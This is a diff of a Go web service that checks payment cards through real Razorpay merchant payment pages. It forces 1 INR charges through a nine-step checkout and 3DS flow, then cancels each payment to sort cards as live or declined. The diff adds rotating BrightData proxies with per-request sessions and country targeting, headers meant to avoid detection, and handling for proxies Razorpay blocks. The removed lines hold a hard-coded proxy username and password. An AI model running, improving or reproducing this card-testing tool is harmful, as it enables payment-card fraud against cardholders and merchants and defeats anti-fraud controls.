@@ -1,7 +1,3 @@
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 package main
 
 import (
@@ -27,10 +23,6 @@ import (
     "time"
 )
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
 const (
     BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
     BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
@@ -39,49 +31,109 @@ const (
 
 var (
     razorpayURLs = []string{
-          "https://pages.razorpay.com/yogapremium",
-          "https://pages.razorpay.com/elite-pay",
-
-
-
-
-        
-        
-           
-        
-        
-        
+        "https://pages.razorpay.com/elite-pay",
+        "https://pages.razorpay.com/mitzvahpay",
+        "https://pages.razorpay.com/yogapremium",
     }
     urlIndex   uint64
     proxyIndex uint64
 )
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ PROXY FORMATTING WITH BRIGHTDATA SUPPORT ============
 
-func getNextURL() string {
-    idx := atomic.AddUint64(&urlIndex, 1) - 1
-    return razorpayURLs[idx%uint64(len(razorpayURLs))]
+func generateSessionID() string {
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    b := make([]byte, 16)
+    for i := range b {
+        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
+        b[i] = chars[n.Int64()]
+    }
+    return string(b)
 }
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
 
 func formatProxy(raw string) string {
     raw = strings.TrimSpace(raw)
     if raw == "" {
         return ""
     }
+    
+    // If already has protocol, return as-is
     if strings.Contains(raw, "://") {
         return raw
     }
+    
+    // Handle BrightData format: host:port:username:password
     parts := strings.Split(raw, ":")
-    if len(parts) == 4 {
-        return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
+    if len(parts) >= 4 {
+        host := parts[0]
+        port := parts[1]
+        // Username might contain colons (for BrightData with options)
+        username := strings.Join(parts[2:len(parts)-1], ":")
+        password := parts[len(parts)-1]
+        
+        // Check if this is BrightData and needs session
+        if strings.Contains(username, "brd-customer") && strings.Contains(username, "zone-") {
+            // Generate unique session ID for this request
+            sessionID := generateSessionID()
+            
+            // Check if username already has session parameter
+            if !strings.Contains(username, "-session-") {
+                username = username + "-session-" + sessionID
+            }
+            
+            // Add country targeting for better success rate (US)
+            if !strings.Contains(username, "-country-") {
+                username = username + "-country-us"
+            }
+        }
+        
+        return fmt.Sprintf("http://%s:%s@%s:%s", username, password, host, port)
     }
+    
+    // Fallback: just add http://
     return "http://" + raw
+}
+
+// ============ BRIGHTDATA PROXY VALIDATION ============
+
+func isBrightDataProxy(proxyURL string) bool {
+    return strings.Contains(proxyURL, "brd.superproxy.io") || 
+           strings.Contains(proxyURL, "brightdata.com") ||
+           strings.Contains(proxyURL, "brd-customer")
+}
+
+func enhanceBrightDataProxy(proxyURL string) string {
+    if !isBrightDataProxy(proxyURL) {
+        return proxyURL
+    }
+    
+    // Parse the proxy URL
+    parsed, err := url.Parse(proxyURL)
+    if err != nil {
+        return proxyURL
+    }
+    
+    username := parsed.User.Username()
+    password, _ := parsed.User.Password()
+    
+    // Add session if not present
+    if !strings.Contains(username, "-session-") {
+        sessionID := generateSessionID()
+        username = username + "-session-" + sessionID
+    }
+    
+    // Add country targeting if not present
+    if !strings.Contains(username, "-country-") {
+        username = username + "-country-us"
+    }
+    
+    // Rebuild URL
+    return fmt.Sprintf("%s://%s:%s@%s", parsed.Scheme, username, password, parsed.Host)
+}
+
+func getNextURL() string {
+    idx := atomic.AddUint64(&urlIndex, 1) - 1
+    return razorpayURLs[idx%uint64(len(razorpayURLs))]
 }
 
 func loadProxies(filepath string) []string {
@@ -105,19 +157,21 @@ func loadProxies(filepath string) []string {
 }
 
 func getNextProxy(proxyList []string) string {
-    return "http://brd-customer-hl_811cf298-zone-datacenter_proxy2:yhqq9su8bgxx@brd.superproxy.io:44445"
-
-    
     if len(proxyList) == 0 {
-        return "http://brd-customer-hl_811cf298-zone-datacenter_proxy2:yhqq9su8bgxx@brd.superproxy.io:44445"
+        return ""
     }
     idx := atomic.AddUint64(&proxyIndex, 1) - 1
-    return proxyList[idx%uint64(len(proxyList))]
+    proxy := proxyList[idx%uint64(len(proxyList))]
+    
+    // Enhance BrightData proxy with session and country
+    if isBrightDataProxy(proxy) {
+        proxy = enhanceBrightDataProxy(proxy)
+    }
+    
+    return proxy
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ UTILITY FUNCTIONS ============
 
 func randInt(min, max int) int {
     n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
@@ -176,9 +230,6 @@ func findBetween(content, start, end string) string {
     return content[si : si+ei]
 }
 
-// extractJSONVar uses brace counting instead of regex — Go's RE2 does NOT
-// backtrack like PHP's PCRE, so `[\s\S]*?` stops at the first `}` (which is
-// inside a nested object), producing truncated/corrupt JSON.
 func extractJSONVar(content, varName string) string {
     prefix := "var " + varName + " ="
     startIdx := strings.Index(content, prefix)
@@ -187,7 +238,6 @@ func extractJSONVar(content, varName string) string {
     }
     startIdx += len(prefix)
 
-    // skip whitespace
     for startIdx < len(content) {
         c := content[startIdx]
         if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
@@ -254,9 +304,7 @@ func generateRzpSessionID() string {
     return string(buf)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ HTTP CLIENT WITH PROXY SUPPORT ============
 
 type FetchResponse struct {
     Body       string
@@ -287,11 +335,12 @@ func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
 
     transport := &http.Transport{
         TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
-        MaxIdleConns:        10,
-        IdleConnTimeout:     30 * time.Second,
+        MaxIdleConns:        20,
+        IdleConnTimeout:     60 * time.Second,
         DisableCompression:  false,
         DisableKeepAlives:   false,
-        MaxIdleConnsPerHost: 5,
+        MaxIdleConnsPerHost: 10,
+        ResponseHeaderTimeout: 30 * time.Second,
     }
 
     if proxyURL != "" {
@@ -300,12 +349,13 @@ func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
             return nil, fmt.Errorf("invalid proxy url: %w", err)
         }
         transport.Proxy = http.ProxyURL(parsed)
+        log.Printf("🔧 Using proxy: %s", maskProxy(proxyURL, "LIVE"))
     }
 
     client := &http.Client{
         Transport: transport,
         Jar:       jar,
-        Timeout:   30 * time.Second,
+        Timeout:   60 * time.Second,
         CheckRedirect: func(req *http.Request, via []*http.Request) error {
             if len(via) >= 5 {
                 return errors.New("too many redirects")
@@ -337,6 +387,17 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
     }
     for k, v := range headers {
         req.Header.Set(k, v)
+    }
+
+    // Add common headers to avoid detection
+    if _, ok := headers["Accept-Language"]; !ok {
+        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+    }
+    if _, ok := headers["Accept-Encoding"]; !ok {
+        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+    }
+    if _, ok := headers["Connection"]; !ok {
+        req.Header.Set("Connection", "keep-alive")
     }
 
     resp, err := f.client.Do(req)
@@ -393,9 +454,7 @@ func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, form
     return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ CHECK RESULT ============
 
 type CheckResult struct {
     Status      string `json:"status"`
@@ -404,9 +463,7 @@ type CheckResult struct {
     ProxyStatus string `json:"proxy_status"`
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ CARD CHECKING LOGIC ============
 
 func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     yy2 := yy
@@ -423,16 +480,18 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     rzpDeviceID, fhash := generateRzpDeviceID()
     rzpSessionID := generateRzpSessionID()
 
+    // Enhance BrightData proxy with session and country
+    if isBrightDataProxy(proxyURL) {
+        proxyURL = enhanceBrightDataProxy(proxyURL)
+    }
+
     fetch, err := NewCustomFetch(proxyURL, ua)
     if err != nil {
         return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
     }
     defer fetch.client.CloseIdleConnections()
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 1: Get payment page
     r1, err := fetch.Get(targetURL, map[string]string{
         "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
@@ -442,7 +501,12 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
     r1Text := r1.Text()
 
-    // Use brace-counting parser instead of regex
+    // Check for 403 error
+    if r1.StatusCode == 403 {
+        log.Printf("⚠️ 403 Forbidden on %s - proxy may be blocked", targetURL)
+        return CheckResult{Status: "error", Message: "403 Forbidden - Proxy blocked by Razorpay", Proxy: proxyURL, ProxyStatus: "DEAD"}
+    }
+
     jsonStr := extractJSONVar(r1Text, "data")
     if jsonStr == "" {
         return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
@@ -469,7 +533,6 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     var plink, ppid string
-    // Force 1 INR (100 paise) — never use 0 from potentially missing JSON fields
     const forceAmount float64 = 100
 
     if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
@@ -495,10 +558,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     keylessHeader := getStringFromMap(initData, "keyless_header")
     keylessHeaderURL := url.QueryEscape(keylessHeader)
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 2: Create order
     r2Payload := map[string]interface{}{
         "notes":      map[string]string{"comment": "", "name": "User"},
         "line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
@@ -550,10 +610,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         orderCurrency = "INR"
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 3: Get session token
     params3 := url.Values{
         "traffic_env":        {"production"},
         "build":              {BUILD},
@@ -576,6 +633,12 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         return makeProxyError(err, proxyURL)
     }
     r3Text := r3.Text()
+
+    // Check for 403
+    if r3.StatusCode == 403 {
+        log.Printf("⚠️ 403 Forbidden on session token - proxy may be blocked")
+        return CheckResult{Status: "error", Message: "403 Forbidden - Session token blocked", Proxy: proxyURL, ProxyStatus: "DEAD"}
+    }
 
     sessid := findBetween(r3Text, `window.session_token="`, `";`)
     if sessid == "" {
@@ -601,10 +664,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         }
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 4: Preferences
     {
         resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
         queryArr := make([]map[string]string, 0, len(resources))
@@ -639,10 +699,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         )
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 5: Checkout order
     {
         form5 := url.Values{
             "notes[email]":          {email},
@@ -683,10 +740,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         )
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 6: CB flows
     {
         r6Payload := map[string]interface{}{
             "identifiers": map[string]interface{}{
@@ -710,10 +764,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         )
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 7: Create payment
     tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
     form7 := url.Values{
@@ -766,9 +817,15 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         return makeProxyError(err, proxyURL)
     }
 
+    // Check for 403 on payment creation
+    if r7.StatusCode == 403 {
+        log.Printf("⚠️ 403 Forbidden on payment creation - proxy may be blocked")
+        return CheckResult{Status: "error", Message: "403 Forbidden - Payment creation blocked", Proxy: proxyURL, ProxyStatus: "DEAD"}
+    }
+
     var r7Data map[string]interface{}
     if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
-        return CheckResult{Status: "error", Message: "Payment create response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
+        return CheckResult{Status: "error", Message: "Payment create response parse failed: " + r7.Text()[:100], Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
     paymentID := getStringFromMap(r7Data, "payment_id")
@@ -795,10 +852,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 8: 3DS Authentication
     pidClean := paymentID
     if idx := strings.Index(paymentID, "_"); idx != -1 {
         pidClean = paymentID[idx+1:]
@@ -838,10 +892,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         )
     }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
-
+    // Step 9: Final result
     r9, err := fetch.Get(
         fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
         map[string]string{
@@ -888,9 +939,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ HELPER FUNCTIONS ============
 
 func getStringFromMap(m map[string]interface{}, key string) string {
     if m == nil {
@@ -971,6 +1020,7 @@ var proxyErrorKeywords = []string{
     "socket hang up", "HPE_INVALID", "fetch failed",
     "no such host", "connection refused", "connection reset",
     "i/o timeout", "timeout", "proxyconnect",
+    "403 Forbidden", "403",
 }
 
 func makeProxyError(err error, proxyURL string) CheckResult {
@@ -1002,9 +1052,7 @@ func maskProxy(proxyURL, proxyStatus string) string {
     return masked + " [" + proxyStatus + "]"
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ CARD PARSING ============
 
 type ParsedCard struct {
     CC, MM, YY, CVV string
@@ -1059,9 +1107,7 @@ func isDigitsCVV(s string) bool {
     return isDigits(s) && (len(s) == 3 || len(s) == 4)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ LOGGING ============
 
 func logLive(card *ParsedCard, result CheckResult) {
     if result.Status == "charged" || result.Status == "approved" {
@@ -1093,9 +1139,7 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
         result.Message, proxyDisplay, targetURL)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ HTTP HANDLER ============
 
 func handler(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "application/json")
@@ -1150,9 +1194,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
     json.NewEncoder(w).Encode(resp)
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
+// ============ MAIN ============
 
 func main() {
     log.SetFlags(log.Ldate | log.Ltime)
@@ -1161,17 +1203,17 @@ func main() {
 
     addr := fmt.Sprintf("0.0.0.0:%d", PORT)
     log.Printf("=========================================================")
-    log.Printf("  RAZORPAY CARD CHECKER - GO VERSION")
+    log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (FIXED)")
     log.Printf("  Listening on: http://%s", addr)
     log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
+    log.Printf("=========================================================")
+    log.Printf("  ✅ BrightData proxy support added")
+    log.Printf("  ✅ Session persistence enabled")
+    log.Printf("  ✅ Country targeting (US)")
+    log.Printf("  ✅ 403 error handling")
     log.Printf("=========================================================")
 
     if err := http.ListenAndServe(addr, nil); err != nil {
         log.Fatalf("Server failed: %v", err)
     }
 }
-
-
-// ──────────────────────────────────────────────────────────────────────────────
-//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
-// ──────────────────────────────────────────────────────────────────────────────
